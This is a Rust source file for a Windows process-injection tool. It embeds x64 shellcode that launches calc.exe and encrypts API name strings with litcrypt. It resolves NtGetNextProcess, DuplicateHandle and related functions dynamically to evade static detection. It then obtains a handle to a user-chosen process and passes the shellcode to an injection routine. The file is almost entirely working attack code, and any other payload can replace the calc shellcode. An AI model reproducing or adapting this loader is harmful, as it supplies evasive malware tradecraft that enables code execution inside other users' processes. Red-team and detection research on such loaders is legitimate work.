#![allow(non_snake_case)]
#![allow(unused_assignments)]
#![allow(non_camel_case_types)]
#![allow(unused_variables)]

use std::env;

use winapi::{
    shared::{
        minwindef::{BOOL, DWORD, FARPROC},
        ntdef::{HANDLE, NTSTATUS},
    },
    um::winnt::{ACCESS_MASK, MAXIMUM_ALLOWED},
};

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

use rpi::*;

//shellcode for popping calc

pub const SHELL_CODE: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

use std::fs::File;
use std::io::Write;
fn main() {

        // Gather command-line arguments
        let args: Vec<String> = env::args().collect();

        // Check if we have the correct number of arguments
        if args.len() != 2 {
            eprintln!("Usage: {} <target_pid>", args[0]);
            std::process::exit(1);
        }

    match File::create("shellcode.bin") {
        Ok(mut file) => {
            if let Err(e) = file.write_all(&SHELL_CODE) {
                eprintln!("Failed to write shellcode: {}", e);
                return;
            }
            println!("Shellcode written to shellcode.bin");
        },
        Err(e) => {
            eprintln!("Failed to create file: {}", e);
            return;
        }
    }

    // Parse target_pid
    let target_pid: u32 = match args[1].parse() {
        Ok(pid) => pid,
        Err(_) => {
            eprintln!("Error: Invalid target PID");
            std::process::exit(1);
        }
    };

    // Read shellcode from file
    let scode: Vec<u8> = match std::fs::read("shellcode.bin") {
        Ok(code) => code,
        Err(_) => {
            eprintln!("Error: Failed to read shellcode file");
            std::process::exit(1);
        }
    };

    let scode = scode.clone();

    //get handle to target process

    let mut target_handle: HANDLE = 0 as HANDLE;

    let ntdll_handle = ldr_get_dll(&lc!("ntdll.dll"));

    //get the function pointer for NtGetNextProcess
    let getnext_func = ldr_get_fn(ntdll_handle, &lc!("NtGetNextProcess"));

    //define NtGetNextProcess function

    let NtGetNextProcess: unsafe fn(HANDLE, ACCESS_MASK, u32, u32, *mut HANDLE) -> NTSTATUS =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut handle: HANDLE = 0 as _;

    //we already have pid from user

    let process_id: DWORD = target_pid;

    //resolve GetProcessId

    let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("GetProcessId"));

    //define GetProcessId function

    let GetProcessId: unsafe fn(HANDLE) -> DWORD =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    //we already have the pid, just get a handle to it

    while unsafe { NtGetNextProcess(handle, MAXIMUM_ALLOWED, 0, 0, &mut handle) } == 0 {
        //instead of getting module name, get the pid
        let pid: DWORD = 0 as _;
        let pid = unsafe { GetProcessId(handle) };
        if pid == process_id {
            target_handle = handle;
            break;
        }
        //otherwise keep looping
    }

    //println!("Getting handle to target process...");

    //println!("Process Handle: {:x?}", target_handle);

    //is that a pseudo handle? lets pass it to duplicate handle and see what happens

    //get the function pointer for DuplicateHandle
    let kernel32_handle = ldr_get_dll(&lc!("kernel32.dll"));
    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("DuplicateHandle"));

    //define DuplicateHandle function

    let DuplicateHandle: unsafe fn(
        HANDLE,
        HANDLE,
        HANDLE,
        *mut HANDLE,
        ACCESS_MASK,
        BOOL,
        DWORD,
    ) -> BOOL = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let mut new_handle: HANDLE = 0 as HANDLE;

    let mut duplicate_result: BOOL = 0;

    //resolve GetCurrentProcess

    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("GetCurrentProcess"));

    //define GetCurrentProcess function

    let GetCurrentProcess: unsafe fn() -> HANDLE =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    duplicate_result = unsafe {
        DuplicateHandle(
            GetCurrentProcess(),
            target_handle,
            GetCurrentProcess(),
            &mut new_handle,
            0,
            0,
            0x00000002,
        )
    };

    //check if duplicate handle was successful
    /*
        if duplicate_result == 0 {
            println!("Failed to duplicate handle!");
        } else {
            println!("Handle duplicated successfully!");
        }
    */
    //print the new handle

    //println!("New handle: {:x?}", new_handle);

    //call our process injection here
    let result = injection(new_handle, &scode);

    //get pointer to CloseHandle

    let getnext_func = ldr_get_fn(kernel32_handle, &lc!("CloseHandle"));

    //define CloseHandle function

    let CloseHandle: unsafe fn(HANDLE) -> BOOL =
        unsafe { std::mem::transmute(getnext_func as FARPROC) };

    //close the new process handle
    unsafe {
        let mut close_result: i32 = 0;

        close_result = CloseHandle(new_handle);
    };

    //return the result of the injection
    result
}
